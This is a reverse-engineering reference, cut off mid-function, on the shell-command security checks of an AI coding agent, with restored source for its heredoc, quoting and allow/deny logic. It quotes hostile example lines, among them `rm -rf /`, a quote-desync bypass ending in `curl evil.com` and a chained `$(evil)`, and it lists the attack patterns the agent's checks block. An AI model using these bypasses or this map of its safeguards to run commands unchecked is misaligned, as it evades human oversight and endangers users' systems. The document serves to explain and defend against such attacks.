# Shell Parser: Complete Implementation Reference (Claude Code v2.1.76)

> Deep-dive reverse engineering of the shell parser, security pipeline, sed validation,
> safe command registry, and read-only permission system.

---

## Related Symbols

> Symbol mappings:
> - [symbol_index_infra_integration.md](../00_overview/symbol_index_infra_integration.md) - Integrations (Shell Parser section)

Key functions in this document:
- `parseShellCommand` (bW6) - Full tokenizer with heredoc safety
- `extractSubcommands` (EO) - Splits compound command into subcommands
- `runSecurityChecksSync` (Rp6) - Master security pipeline (sync, no tree-sitter)
- `runSecurityChecksAsync` (O01) - Master security pipeline (async, with tree-sitter)
- `bashPreFlightCheck` (nGq) - LLM-based prefix extraction
- `extractRedirections` (ik) - Redirection analysis
- `checkDangerousRedirection` (f9z) - Per-redirection risk assessment
- `reconstructCommand` (wYz) - Rebuilds command string from token list
- `isReadOnlyCommand` (NcY) - Comprehensive read-only command detection
- `checkReadOnlyBehavior` (Of6) - Main read-only permission gate
- `validateSedCommand` (QU1) - Master sed safety validation
- `isInSafeCommandRegistry` (WcY) - Checks against safe command whitelist
- `stripQuotes` (bY4) - Quote-aware content extraction
- `hasSingleQuotedBackslashBypass` (X38) - Pre-check bypass detector

---

## Architecture Overview

The Shell Parser module spans **5 source files** and implements a layered security model:

```
┌─────────────────────────────────────────────────────────────┐
│                    Bash Tool Execution                       │
└─────────────────────┬───────────────────────────────────────┘
                      │ Command string
                      ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 0: Pre-Check (X38 / hasSingleQuotedBackslashBypass)  │
│  Detects 'a\' pattern that can bypass quote tracking        │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 1: Static Security Checks (Rp6/O01)                  │
│                                                              │
│  Phase A: Allow-list (uY4, mY4, gY4, FY4)                   │
│  Phase B: Deny-list (19 checks total)                       │
│    - pY4, rY4, QY4, UY4, w01, lY4, iY4, dY4, _01, nY4      │
│    - oY4, sY4, tY4, eY4, Kz4, aY4, Az4, qz4, cY4           │
└─────────────────────┬───────────────────────────────────────┘
                      │ behavior: "passthrough"
                      ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 2: LLM Prefix Extraction (nGq / bashPreFlightCheck)  │
│  Extracts command prefix for permission matching            │
│  Also detects injection via "command_injection_detected"    │
└─────────────────────┬───────────────────────────────────────┘
                      │ commandPrefix: "git commit"
                      ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 3: Read-Only Detection (Of6 / checkReadOnlyBehavior) │
│  Determines if command is inherently read-only              │
│  Uses: WcY (registry), NcY (full check), vcY (git detect)  │
└─────────────────────────────────────────────────────────────┘
```

---

## File Map

| File | Lines | Content |
|------|-------|---------|
| `chunks.91.mjs` | ~1100-2500 | Security pipeline: runSecurityChecks, all check functions, SECURITY_CHECK_IDS |
| `chunks.171.mjs` | ~1100-1800 | Shell tokenizer, heredoc handling, prefix extraction, command reconstruction |
| `chunks.56.mjs` | ~945-1100 | extractHeredocs function |
| `chunks.172.mjs` | ~1930-2200 | Permission checking integration, prefix matching |
| `chunks.10.mjs` | ~1031 | CY8 backslash bypass pre-check |

---

## Deep Analysis: Heredoc Extraction Algorithm

### The Problem

Heredocs are multi-line string literals in bash:
```bash
cat <<EOF
This is content that should NOT be parsed as commands
rm -rf / # This is just text, not a command
EOF
```

Without heredoc awareness, the security system would:
- Tokenize `rm -rf /` as a dangerous command
- Flag `#` as a comment injection
- Misparse the multi-line structure

### extractHeredocs (ca) — Complete Source Restoration

**What it does:** Identifies all heredoc blocks in a command, replaces them with unique placeholders, and returns both the processed command and a map of placeholder-to-original-content.

**Location:** chunks.56.mjs:945-1160

```javascript
// ============================================
// extractHeredocs - Extract heredoc blocks and replace with placeholders
// Location: chunks.56.mjs:945-1160
// ============================================

// ORIGINAL (for source lookup):
function ca(A, q) {
    let K = new Map;
    if (!A.includes("<<")) return { processedCommand: A, heredocs: K };
    if (/\$['"]/.test(A)) return { processedCommand: A, heredocs: K };
    let Y = A.indexOf("<<");
    if (Y > 0 && A.slice(0, Y).includes("`")) return { processedCommand: A, heredocs: K };
    if (Y > 0) {
        let f = A.slice(0, Y), v = (f.match(/\(\(/g) || []).length,
            N = (f.match(/\)\)/g) || []).length;
        if (v > N) return { processedCommand: A, heredocs: K }
    }
    let z = new RegExp(Lu3.source, "g"), _ = [], w = [], O, $ = 0,
        H = !1, j = !1, J = !1, M = !1, D = 0,
        X = (f) => {
            for (let v = $; v < f; v++) {
                let N = A[v];
                if (N === "\n") J = !1;
                if (H) { if (N === "'") H = !1; continue }
                if (j) {
                    if (M) { M = !1; continue }
                    if (N === "\\") { M = !0; continue }
                    if (N === '"') j = !1; continue
                }
                if (N === "\\") { D++; continue }
                let V = D % 2 === 1;
                if (D = 0, V) continue;
                if (N === "'") H = !0;
                else if (N === '"') j = !0;
                else if (!J && N === "#") J = !0
            }
            $ = f
        };
    while ((O = z.exec(A)) !== null) {
        let f = O.index;
        if (X(f), H || j) continue;
        if (J) continue;
        if (D % 2 === 1) continue;
        // ... find delimiter end, handle nesting, generate placeholders ...
    }
    if (_.length === 0) return { processedCommand: A, heredocs: K };
    // Filter nested heredocs, sort by descending position, replace with placeholders
    let P = _.filter((f, v, N) => {
        for (let V of N) {
            if (f === V) continue;
            if (f.operatorStartIndex > V.contentStartIndex && f.operatorStartIndex < V.contentEndIndex) return !1
        }
        return !0
    });
    P.sort((f, v) => v.contentEndIndex - f.contentEndIndex);
    let Z = yu3(), G = A;
    return P.forEach((f, v) => {
        let N = P.length - 1 - v, V = `__HEREDOC_${N}_${Z}__`;
        K.set(V, f), G = G.slice(0, f.operatorStartIndex) + V + G.slice(f.operatorEndIndex, f.contentStartIndex) + G.slice(f.contentEndIndex)
    }), { processedCommand: G, heredocs: K }
}

// READABLE (for understanding):
function extractHeredocs(command, options) {
    let heredocMap = new Map();

    // Early exit: no heredoc operators
    if (!command.includes("<<")) return { processedCommand: command, heredocs: heredocMap };

    // Safety: skip if ANSI-C/locale quoting present (complex parsing)
    if (/\$['"]/.test(command)) return { processedCommand: command, heredocs: heredocMap };

    // Safety: skip if backticks before << (command substitution context)
    let firstHeredocPos = command.indexOf("<<");
    if (firstHeredocPos > 0 && command.slice(0, firstHeredocPos).includes("`"))
        return { processedCommand: command, heredocs: heredocMap };

    // Safety: skip if unbalanced arithmetic expansion before <<
    if (firstHeredocPos > 0) {
        let prefix = command.slice(0, firstHeredocPos);
        let openArith = (prefix.match(/\(\(/g) || []).length;
        let closeArith = (prefix.match(/\)\)/g) || []).length;
        if (openArith > closeArith) return { processedCommand: command, heredocs: heredocMap };
    }

    // State machine variables for quote/comment tracking
    let inSingleQuote = false;    // H
    let inDoubleQuote = false;    // j
    let inComment = false;        // J
    let escapedInDouble = false;  // M
    let backslashCount = 0;       // D
    let lastProcessedIndex = 0;   // $

    // Track quote/comment context while scanning for <<
    function processContextUpTo(index) {
        for (let i = lastProcessedIndex; i < index; i++) {
            let ch = command[i];
            if (ch === "\n") inComment = false;  // Newline ends comment

            if (inSingleQuote) {
                if (ch === "'") inSingleQuote = false;
                continue;
            }
            if (inDoubleQuote) {
                if (escapedInDouble) { escapedInDouble = false; continue; }
                if (ch === "\\") { escapedInDouble = true; continue; }
                if (ch === '"') inDoubleQuote = false;
                continue;
            }
            if (ch === "\\") { backslashCount++; continue; }
            let isEscaped = backslashCount % 2 === 1;
            backslashCount = 0;
            if (isEscaped) continue;

            if (ch === "'") inSingleQuote = true;
            else if (ch === '"') inDoubleQuote = true;
            else if (!inComment && ch === "#") inComment = true;
        }
        lastProcessedIndex = index;
    }

    let heredocRegex = /(?<!<)<<(?!<)(-)?[ \t]*(?:(['"])(\\?\w+)\2|\\?(\w+))/g;
    let matches = [];
    let seenRanges = [];  // Track already-processed heredoc content ranges

    while ((match = heredocRegex.exec(command)) !== null) {
        let matchStart = match.index;
        processContextUpTo(matchStart);  // Update quote state up to this position

        // Skip if inside quotes or comment
        if (inSingleQuote || inDoubleQuote || inComment) continue;
        if (backslashCount % 2 === 1) continue;  // Escaped <<

        // Skip if this << is inside another heredoc's content
        let isNested = seenRanges.some(range =>
            matchStart > range.contentStartIndex && matchStart < range.contentEndIndex
        );
        if (isNested) continue;

        // Parse heredoc operator
        let isTabStripping = match[1] === "-";
        let delimiter = match[3] || match[4];  // Quoted or unquoted delimiter
        let operatorEnd = matchStart + match[0].length;
        let hasQuotedDelimiter = !!match[2] || match[0].includes("\\");

        // Find content start (after newline following operator)
        let contentStart = -1;
        for (let i = operatorEnd; i < command.length; i++) {
            if (command[i] === "\n") {
                contentStart = i + 1;
                break;
            }
        }
        if (contentStart === -1) continue;  // No newline found, invalid heredoc

        // Find content end (line matching delimiter)
        let lines = command.slice(contentStart).split("\n");
        let contentEndLine = -1;
        for (let i = 0; i < lines.length; i++) {
            let line = lines[i];
            let compareLine = isTabStripping ? line.replace(/^\t*/, "") : line;
            if (compareLine === delimiter) {
                contentEndLine = i;
                break;
            }
        }
        if (contentEndLine === -1) continue;  // No closing delimiter found

        let contentEndIndex = contentStart + lines.slice(0, contentEndLine + 1).join("\n").length;

        // Record this heredoc
        matches.push({
            fullText: command.slice(matchStart, contentEndIndex),
            delimiter,
            operatorStartIndex: matchStart,
            operatorEndIndex: operatorEnd,
            contentStartIndex: contentStart,
            contentEndIndex: contentEndIndex
        });
    }

    if (matches.length === 0) return { processedCommand: command, heredocs: heredocMap };

    // Filter out heredocs whose operator is inside another's content
    let filtered = matches.filter((m, idx, all) => {
        return !all.some(other => other !== m &&
            m.operatorStartIndex > other.contentStartIndex &&
            m.operatorStartIndex < other.contentEndIndex);
    });

    if (filtered.length === 0) return { processedCommand: command, heredocs: heredocMap };

    // Sort by descending content end index (reverse order for safe replacement)
    filtered.sort((a, b) => b.contentEndIndex - a.contentEndIndex);

    // Generate random hex suffix for collision prevention
    let randomHex = generateRandomHex();  // yu3(): 16-char random hex

    // Replace each heredoc with placeholder
    let processed = command;
    filtered.forEach((heredoc, idx) => {
        let placeholderIndex = filtered.length - 1 - idx;  // 0-based from left
        let placeholder = `__HEREDOC_${placeholderIndex}_${randomHex}__`;
        heredocMap.set(placeholder, heredoc);
        processed = processed.slice(0, heredoc.operatorStartIndex) + placeholder +
                    processed.slice(heredoc.operatorEndIndex, heredoc.contentStartIndex) +
                    processed.slice(heredoc.contentEndIndex);
    });

    return { processedCommand: processed, heredocs: heredocMap };
}

// Mapping: ca→extractHeredocs, A→command, q→options, K→heredocMap, H→inSingleQuote,
//          j→inDoubleQuote, J→inComment, M→escapedInDouble, D→backslashCount,
//          $→lastProcessedIndex, Lu3→HEREDOC_REGEX, yu3→generateRandomHex
```

### generateRandomHex (yu3)

```javascript
// ============================================
// generateRandomHex - Generate random hex string for placeholders
// Location: chunks.56.mjs:941
// ============================================

// ORIGINAL (for source lookup):
function yu3() {
    return Vu3(8).toString("hex")
}

// READABLE (for understanding):
function generateRandomHex() {
    return crypto.randomBytes(8).toString("hex");  // 8 bytes = 16 hex chars
}

// Mapping: yu3→generateRandomHex, Vu3→crypto.randomBytes
```

### State Machine for Quote/Comment Context

The heredoc extraction uses a multi-state tracking system to determine whether a `<<` operator is inside a quoted string or comment:

| State Variable | Meaning | Trigger to Enter | Trigger to Exit |
|----------------|---------|------------------|-----------------|
| `H` (inSingleQuote) | Inside `'...'` | `'` outside other contexts | `'` (no escape in single quotes) |
| `j` (inDoubleQuote) | Inside `"..."` | `"` outside other contexts | Unescaped `"` |
| `J` (inComment) | Inside `#...` | `#` outside quotes | Newline `\n` |
| `M` (escapedInDouble) | After `\` in double quote | `\` inside double quotes | Any character (skip one) |
| `D` (backslashCount) | Count of consecutive `\` | `\` outside quotes | Non-backslash character |

**Why this state machine is critical:**

1. **Single quotes have no escape sequences** — Inside `'...'`, a backslash is literal. The state machine correctly handles this by NOT checking for escapes when `H` is true.

2. **Double quotes support escapes** — Inside `"..."`, `\"` is an escaped quote, not a string terminator. The `M` flag tracks this.

3. **Comments ignore everything until newline** — Once `#` is seen outside quotes, all characters until `\n` are comment content, including `<<` operators.

4. **Backslash context matters outside quotes** — An odd number of backslashes before `<<` means it's escaped (`\<<`), so it should be skipped.

### Placeholder Design

**Format:** `__HEREDOC_N_HEXADECIMAL__`
- `N` = 0-based index from left to right in the original command
- `HEXADECIMAL` = 16-character random hex string

**Example:**
```
Original: cat <<EOF\nhello\nEOF | grep foo
Processed: cat __HEREDOC_0_a3f4b2c5d6e7f8a9__ | grep foo
```

**Why this format:**
1. Double underscores at start/end make it unlikely to collide with actual content
2. Index allows reverse-mapping during restoration
3. Random hex suffix prevents collision if command literally contains `__HEREDOC_0__`

### Nesting Detection

The algorithm handles nested heredoc operators:

```bash
cat <<OUTER
This has <<INSIDE which is just text
OUTER
```

The second `<<INSIDE` is inside `OUTER`'s content, so it's filtered out:

```javascript
// Filter: remove heredoc operators that appear inside another heredoc's content
let filtered = matches.filter(m => {
    return !matches.some(other => m !== other &&
        m.operatorStartIndex > other.contentStartIndex &&
        m.operatorStartIndex < other.contentEndIndex);
});
```

---

## Deep Analysis: Security Check Pipeline Order

### Why Allow-List Runs Before Deny-List

The security pipeline is structured in two phases:

**Phase A (Allow-list):** Checks that can approve a command as safe
**Phase B (Deny-list):** Checks that can flag a command as dangerous

**Rationale for this ordering:**

1. **Performance optimization**: Common safe patterns (empty commands, git commit, heredocs) are detected first and short-circuit the expensive deny-list checks.

2. **False positive prevention**: Some patterns that LOOK dangerous are actually safe:
   - `git commit -m "$(date)"` — The `$()` is inside a quoted commit message
   - `cat <<'EOF' ... EOF` — Quoted heredoc delimiters prevent variable expansion
   - Empty commands are trivially safe

3. **Semantic correctness**: The allow-list checks provide context that changes the interpretation of later patterns. For example, if `checkGitCommitMessage` approves a command, we don't want `checkDangerousPatterns` to flag the `$()` inside the message.

### Complete Phase A Checks

| Function | Symbol | Condition | Result |
|----------|--------|-----------|--------|
| checkEmptyCommand | uY4 | Command is whitespace-only | `"allow"` |
| checkIncompleteCommand | mY4 | Starts with tab, `-`, or operator | `"ask"` (not allow) |
| checkHeredocInSubstitution | gY4 | `$(cat <<'EOF'...)` pattern | `"allow"` |
| checkGitCommitMessage | FY4 | `git commit -m "..."` with safe message | `"allow"` |

> **Note:** The `checkQuotedHeredoc` function mentioned in earlier versions is not a separate check in v2.1.76. Quoted heredoc handling is integrated into `gY4` (checkHeredocInSubstitution) via the `Hg9` helper which validates `<<'DELIM'` and `<<\DELIM` patterns within command substitutions.

### Complete Phase B Checks (Deny-List)

The deny-list checks run in a specific order designed to catch the most common/severe attacks first:

| Order | Function | Symbol | What It Detects |
|-------|----------|--------|-----------------|
| 1 | checkJqCommand | pY4 | `jq system()`, file-reading flags |
| 2 | checkObfuscatedFlags | rY4 | ANSI-C quoting, locale quoting, quoted flags |
| 3 | checkShellMetacharacters | QY4 | `;`, `\|`, `&` in quoted arguments |
| 4 | checkDangerousVariables | UY4 | `$VAR` in redirection/pipe contexts |
| 5 | checkCommentQuoteDesync | Az4 | Quote inside `#` comment |
| 6 | checkQuotedNewline | qz4 | Quoted newline + `#` pattern |
| 7 | checkExcessClosingBraces | cY4 | Unbalanced braces after quote strip |
| 8 | checkNewlines | w01 | Embedded newlines as command separators |
| 9 | checkIFSInjection | lY4 | `$IFS` manipulation |
| 10 | checkProcEnviron | iY4 | `/proc/*/environ` access |
| 11 | checkDangerousPatterns | dY4 | Backticks, `$()`, `${}`, `<()`, `>()` |
| 12 | checkRedirections | _01 | `<` and `>` in unquoted content |
| 13 | checkBackslashEscapedWhitespace | oY4 | `\` before space/tab |
| 14 | checkBackslashEscapedOperators | aY4 | `\;`, `\|`, `\&`, `\<`, `\>` |
| 15 | checkUnicodeWhitespace | tY4 | Non-ASCII whitespace chars |
| 16 | checkMidWordHash | eY4 | `#` in middle of word |
| 17 | checkBraceExpansion | sY4 | `{a,b}` or `{1..3}` patterns |
| 18 | checkZshDangerousCommands | Kz4 | zmodload, emulate, sysopen, etc. |
| 19 | checkMalformedTokenInjection | nY4 | Unbalanced brackets around separators |

**Why this specific order?**

- **jq first**: `jq` is a commonly-used tool, and its `system()` function is a severe vulnerability
- **Obfuscation checks early**: ANSI-C quoting can hide newlines and other dangerous characters
- **Metacharacters before patterns**: `;` in a quoted arg might be false positive if we checked `$()` first
- **IFS/Proc late**: These are specific attack vectors that are less common
- **Malformed tokens last**: This is a catch-all for parser confusion attacks

## Layer 0: Pre-Check — Single-Quote Backslash Bypass

### hasSingleQuotedBackslashBypass (CY8)

**What it does:** Detects the `'a\'` pattern — where a backslash inside single quotes is followed by a closing single quote — which can confuse naive quote-state trackers into thinking they're inside a quote when they're not.

**How it works:**
1. Walks the command character by character, tracking double-quote (`"`) and single-quote (`'`) state
2. When a `'` closes single-quote mode, checks if the previous two characters were `'\` (backslash just before the closing `'`)
3. If found, this specific pattern (`'...'`) where the backslash appears to close the quote is flagged as a bypass

```javascript
// ============================================
// hasSingleQuotedBackslashBypass - Detects 'a\' bypass pattern
// Location: chunks.10.mjs:1031
// ============================================

// ORIGINAL (for source lookup):
function CY8(A) {
    let q = !1, K = !1;
    for (let Y = 0; Y < A.length; Y++) {
        let z = A[Y];
        if (z === "\\" && !q) { Y++; continue }
        if (z === '"' && !q) { K = !K; continue }
        if (z === "'" && !K) {
            if (q = !q, !q && Y >= 2 && A[Y - 1] === "\\" && A[Y - 2] === "'") return !0;
            continue
        }
    }
    return !1
}

// READABLE (for understanding):
function hasSingleQuotedBackslashBypass(command) {
    let inSingleQuote = false, inDoubleQuote = false;
    for (let i = 0; i < command.length; i++) {
        let ch = command[i];
        if (ch === "\\" && !inSingleQuote) { i++; continue }   // skip escaped char
        if (ch === '"' && !inSingleQuote) { inDoubleQuote = !inDoubleQuote; continue }
        if (ch === "'" && !inDoubleQuote) {
            if (inSingleQuote = !inSingleQuote,
                !inSingleQuote && i >= 2 &&
                command[i-1] === "\\" && command[i-2] === "'") return true;
            continue
        }
    }
    return false
}

// Mapping: CY8→hasSingleQuotedBackslashBypass, q→inSingleQuote, K→inDoubleQuote
```

**Why this attack works:**
```bash
git status'\''; curl evil.com  # The '\'' ends the quote context unexpectedly
```
The sequence `'\''` is shell idiom for embedding a single quote in a single-quoted string. Naïve trackers see: `'` (open quote), `\` (backslash), `'` (close quote) — thinking they're outside quotes when the actual shell sees more complex semantics.

---

## Layer 1: Static Security Checks

### Quote Stripping Infrastructure

Before running security checks, the command is preprocessed to remove quotes for deeper inspection.

#### stripQuotes (UY4)

**What it does:** Produces three versions of the command:
1. `withDoubleQuotes`: single quotes removed but double quotes preserved (for patterns that need to see what's inside double-quotes)
2. `fullyUnquoted`: both single and double quotes removed
3. `unquotedKeepQuoteChars`: preserves quote chars but removes escaping

**How it works (character-by-character state machine):**

```javascript
// ============================================
// stripQuotes - Dual-mode quote removal
// Location: chunks.91.mjs:~1150
// ============================================

// READABLE (for understanding):
function stripQuotes(command, isJq = false) {
    let withDoubleQuotes = "", fullyUnquoted = "", unquotedKeepQuoteChars = "";
    let inSingleQuote = false, inDoubleQuote = false, escaped = false;

    for (let i = 0; i < command.length; i++) {
        let ch = command[i];
        if (escaped) {
            // Post-escape char: include only if not in single quotes
            escaped = false;
            if (!inSingleQuote) withDoubleQuotes += ch;
            if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += ch;
            if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += ch;
            continue;
        }
        if (ch === "\\" && !inSingleQuote) {
            // Backslash: set escape flag but include the backslash itself
            escaped = true;
            if (!inSingleQuote) withDoubleQuotes += ch;
            if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += ch;
            if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += ch;
            continue;
        }
        if (ch === "'" && !inDoubleQuote) { inSingleQuote = !inSingleQuote; unquotedKeepQuoteChars += ch; continue; }
        if (ch === '"' && !inSingleQuote) {
            inDoubleQuote = !inDoubleQuote;
            unquotedKeepQuoteChars += ch;
            if (!isJq) continue;  // For jq: preserve double quotes in output
        }
        if (!inSingleQuote) withDoubleQuotes += ch;
        if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += ch;
        if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += ch;
    }
    return { withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars };
}

// Mapping: UY4→stripQuotes, K→withDoubleQuotes, Y→fullyUnquoted, z→unquotedKeepQuoteChars,
//   _→inSingleQuote, w→inDoubleQuote, O→escaped
```

**Key design decisions:**
- **jq exception**: The `isJq` flag keeps double quotes in the output when the base command is `jq`, because jq's filter language uses `$var` and `"string"` which would produce false positives if double quotes were stripped. The `isJq` flag is set when `baseCommand === "jq"`.
- **Backslash handling**: The backslash character itself is included in output (not just the escaped char), to preserve `\"` sequences for downstream checks that look for escaped patterns.

#### stripRedirections (xY4)

**What it does:** Removes standard/safe redirect patterns from the fully-unquoted content before pattern matching.

```javascript
// ============================================
// stripRedirections - Remove safe redirect noise
// Location: chunks.91.mjs:1206
// ============================================

// ORIGINAL (for source lookup):
function xY4(A) {
    return A.replace(/\s+2\s*>&\s*1(?=\s|$)/g, "")
             .replace(/[012]?\s*>\s*\/dev\/null(?=\s|$)/g, "")
             .replace(/\s*<\s*\/dev\/null(?=\s|$)/g, "")
}

// READABLE (for understanding):
function stripRedirections(content) {
    return content
        .replace(/\s+2\s*>&\s*1(?=\s|$)/g, "")      // Remove "2>&1" (stderr to stdout)
        .replace(/[012]?\s*>\s*\/dev\/null(?=\s|$)/g, "")    // Remove "> /dev/null", "2>/dev/null"
        .replace(/\s*<\s*\/dev\/null(?=\s|$)/g, "")           // Remove "< /dev/null"
}

// Mapping: xY4→stripRedirections
```

**Why this matters:** Common patterns like `command 2>&1 | other` or `command > /dev/null` contain `>` and `>&` which would falsely trigger dangerous-redirection checks. Stripping these known-safe patterns first prevents false positives.

---

### Phase A: Allow-List Checks

Allow-list checks run first. If any returns `"allow"`, the deny-list is skipped entirely.

#### checkEmptyCommand (uY4)

```javascript
// ============================================
// checkEmptyCommand - Allow empty commands
// Location: chunks.91.mjs:1224
// ============================================
function uY4(A) {
    if (!A.originalCommand.trim()) return {
        behavior: "allow",
        updatedInput: { command: A.originalCommand },
        decisionReason: { type: "other", reason: "Empty command is safe" }
    };
    return { behavior: "passthrough", message: "Command is not empty" }
}
```

#### checkIncompleteCommand (mY4)

**What it does:** Detects commands that appear to be fragments of a larger command.

**Detected patterns:**
- Starts with a tab → likely an indented continuation in a multi-line script
- Starts with `-` → a bare flag without a command
- Starts with `&&`, `||`, `;`, `>>`, `<` → an operator that should follow a command

```javascript
// ============================================
// checkIncompleteCommand - Detect command fragments
// Location: chunks.91.mjs:1241
// ============================================

// ORIGINAL (for source lookup):
function mY4(A) {
    let { originalCommand: q } = A, K = q.trim();
    if (/^\s*\t/.test(q)) return d("tengu_bash_security_check_triggered",
        { checkId: w3.INCOMPLETE_COMMANDS, subId: 1 }),
        { behavior: "ask", message: "Command appears to be an incomplete fragment (starts with tab)" };
    if (K.startsWith("-")) return d("tengu_bash_security_check_triggered",
        { checkId: w3.INCOMPLETE_COMMANDS, subId: 2 }),
        { behavior: "ask", message: "Command appears to be an incomplete fragment (starts with flags)" };
    if (/^\s*(&&|\|\||;|>>?|<)/.test(q)) return d("tengu_bash_security_check_triggered",
        { checkId: w3.INCOMPLETE_COMMANDS, subId: 3 }),
        { behavior: "ask", message: "Command appears to be a continuation line (starts with operator)" };
    return { behavior: "passthrough", message: "Command appears complete" }
}

// READABLE (for understanding):
function checkIncompleteCommand({ originalCommand }) {
    let trimmed = originalCommand.trim();
    if (/^\s*\t/.test(originalCommand))
        return { behavior: "ask", message: "Incomplete fragment (starts with tab)" };
    if (trimmed.startsWith("-"))
        return { behavior: "ask", message: "Incomplete fragment (starts with flag)" };
    if (/^\s*(&&|\|\||;|>>?|<)/.test(originalCommand))
        return { behavior: "ask", message: "Continuation line (starts with operator)" };
    return { behavior: "passthrough" };
}

// Mapping: mY4→checkIncompleteCommand, q→originalCommand, K→trimmed
```

**Why tab detection?** The LLM sometimes generates indented shell script fragments instead of standalone commands. A command starting with a tab is almost always a fragment from a multi-line heredoc or script block.

#### checkHeredocInSubstitution (gY4) + isQuotedHeredocInSubstitution (Hg9)

**What it does:** Allows `$(cat <<'EOF' ... EOF)` patterns — Claude Code's own standard format for multi-line strings. Without this allowance, Claude Code would flag its own commands as dangerous.

**How Hg9 works (step by step):**
1. Check if command matches `HEREDOC_IN_SUBSTITUTION_PATTERN` (`lV8` = `/\$\(.*<</`)
2. Find all `$(cat <<'DELIM'` or `$(cat <<\DELIM` patterns
3. For each, verify the full `$(cat <<'DELIM'\n...\nDELIM)` structure is present
4. After replacing all safe heredocs, check if any `$(` or `${` remain
5. If residual substitutions exist, it's NOT safe

```javascript
// ============================================
// isQuotedHeredocInSubstitution - Validates $(cat <<'EOF') safety
// Location: chunks.149.mjs:2866
// ============================================

// ORIGINAL (for source lookup):
function odY(A) {
    if (!PhA.test(A)) return !1;
    let q = /\$\(cat\s*<<-?\s*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g, K, Y = [];
    while ((K = q.exec(A)) !== null) {
        let w = K[1] || K[2];
        if (w) Y.push({ start: K.index, delimiter: w })
    }
    if (Y.length === 0) return !1;
    for (let { start: w, delimiter: H } of Y) {
        let $ = A.substring(w), O = H.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
        if (!new RegExp(`(?:\n|^[^\\n]*\n)${O}\\s*\\)`).test($)) return !1;
        let J = new RegExp(`^\\$\\(cat\\s*<<-?\\s*(?:'+${O}'+|\\\\${O})[^\\n]*\\n(?:[\\s\\S]*?\\n)?${O}\\s*\\)`);
        if (!$.match(J)) return !1
    }
    let z = A;
    for (let { delimiter: w } of Y) {
        let H = w.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
            $ = new RegExp(`\\$\\(cat\\s*<<-?\\s*(?:'+${H}'+|\\\\${H})[^\\n]*\\n(?:[\\s\\S]*?\\n)?${H}\\s*\\)`);
        z = z.replace($, "")
    }
    if (/\$\(/.test(z)) return !1;
    if (/\$\{/.test(z)) return !1;
    return !0
}

// READABLE (for understanding):
function isQuotedHeredocInSubstitution(command) {
    if (!HEREDOC_IN_SUBSTITUTION_PATTERN.test(command)) return false;

    // Find all $(cat <<'DELIM') or $(cat <<\DELIM) occurrences
    let quotedHeredocRegex = /\$\(cat\s*<<-?\s*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g;
    let matches = [], match;
    while ((match = quotedHeredocRegex.exec(command)) !== null) {
        let delim = match[1] || match[2];
        if (delim) matches.push({ start: match.index, delimiter: delim });
    }
    if (matches.length === 0) return false;

    // Verify each match has a proper closing delimiter
    for (let { start, delimiter } of matches) {
        let segment = command.substring(start);
        let escapedDelim = delimiter.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
        // Must have a line with just the delimiter before ")"
        if (!new RegExp(`(?:\n|^[^\\n]*\n)${escapedDelim}\\s*\\)`).test(segment)) return false;
        // Full structure must match
        let fullPattern = new RegExp(
            `^\\$\\(cat\\s*<<-?\\s*(?:'+${escapedDelim}'+|\\\\${escapedDelim})[^\\n]*\\n(?:[\\s\\S]*?\\n)?${escapedDelim}\\s*\\)`
        );
        if (!segment.match(fullPattern)) return false;
    }

    // After removing all safe heredocs, no $(  or ${ should remain
    let remaining = command;
    for (let { delimiter } of matches) {
        let escapedDelim = delimiter.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
        let removePattern = new RegExp(
            `\\$\\(cat\\s*<<-?\\s*(?:'+${escapedDelim}'+|\\\\${escapedDelim})[^\\n]*\\n(?:[\\s\\S]*?\\n)?${escapedDelim}\\s*\\)`
        );
        remaining = remaining.replace(removePattern, "");
    }
    if (/\$\(/.test(remaining) || /\$\{/.test(remaining)) return false;
    return true;
}

// Mapping: odY→isQuotedHeredocInSubstitution, PhA→HEREDOC_IN_SUBSTITUTION_PATTERN
```

**Key insight:** The "remaining after removal" check is critical. A command like:
```bash
git commit -m "$(cat <<'EOF'\nfix\nEOF)" && $(evil)
```
Would have its safe heredoc removed, but `$(evil)` would remain, causing the check to return `false` → command goes through deny-list.

#### checkGitCommitMessage (FY4)

**What it does:** Handles the `git commit -m "..."` pattern — one of the most common Claude Code operations. Allows or blocks based on what's inside the message.

**Decision tree:**
```
git commit -m "MESSAGE"?
  ├── Double-quoted + contains $( ` ${  → ASK (substitution risk)
  ├── Content after message has $( ` ${ → PASSTHROUGH (let other checks handle)
  ├── Message starts with "-"           → ASK (flag injection risk)
  └── Otherwise                         → ALLOW
```

```javascript
// ============================================
// checkGitCommitMessage - git commit safety logic
// Location: chunks.91.mjs:1435
// ============================================

// ORIGINAL (for source lookup):
function FY4(A) {
    let { originalCommand: q, baseCommand: K } = A;
    if (K !== "git" || !/^git\s+commit\s+/.test(q)) return { behavior: "passthrough" };
    if (q.includes("\\")) return { behavior: "passthrough" };
    let Y = q.match(/^git[ \t]+commit[ \t]+[^;&|`$<>()\n\r]*?-m[ \t]+(["'])([\s\S]*?)\1(.*)$/);
    if (Y) {
        let [, z, _, w] = Y;
        if (z === '"' && _ && /\$\(|`|\$\{/.test(_)) return { behavior: "ask" };
        if (w && /[;|&()`]|\$\(|\$\{/.test(w)) return { behavior: "passthrough" };
        if (_ && _.startsWith("-")) return { behavior: "ask" };
        return { behavior: "allow", updatedInput: { command: q },
                 decisionReason: { type: "other", reason: "Git commit with simple quoted message is allowed" } }
    }
    return { behavior: "passthrough" }
}

// READABLE (for understanding):
function checkGitCommitMessage({ originalCommand, baseCommand }) {
    if (baseCommand !== "git" || !/^git\s+commit\s+/.test(originalCommand))
        return { behavior: "passthrough" };

